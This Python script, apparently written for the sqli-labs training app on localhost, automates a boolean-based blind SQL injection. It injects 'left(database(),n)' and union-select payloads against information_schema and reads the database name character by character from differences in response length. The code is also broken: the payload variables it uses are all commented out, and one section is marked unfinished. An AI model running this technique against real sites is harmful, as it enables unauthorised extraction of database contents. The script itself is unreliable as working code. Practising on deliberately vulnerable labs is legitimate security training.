import requests
import re

part="http://localhost/sqli-labs-master/Less-5/"
######################判断当前的库#######################

# part1 = "?id=1'and left(database(),"
# part2='1'
# part3= ')>"'
# part_temp=""
# part4 = "a"
# part5 = '"--+'
# payload="?id=1'and left(database(),1)>'a'--+"

###################列出所有库##############################(未好)

# part1 = "?id=-1'union select 1,2,(left((schema_name),"
# part2='1'
# part3= ')>"'
# part_temp=""
# part4 = "a"
# part5 = '") from information_schema.schemata--+'
# payload="?id=-1'union select 1,2,(left(group_concat(schema_name),1)>'a') from information_schema.schemata--+"
#########################变量赋值################################

url=part+payload
html=requests.get(url).text
temp=html

if __name__ == '__main__':
    while (1):
        payload = part1 + part2 + part3 + part_temp + part4 + part5
        # print(payload)
        url = part + payload
        # print(url)
        html = requests.get(url).text
        if (len(html) > len(temp)):
            # print("payload is"+payload)

            # print(part4)
            part_temp = part_temp + part4
            part2 = str(int(part2) + 1)  # part2 增加
            print(part_temp)
            part4 = "a"
        else:
            temp = html
            part4 = chr((int)(ord(part4) + 1))
            if (part4 == '\\'):
                part4 = chr((int)(ord(part4) + 1))
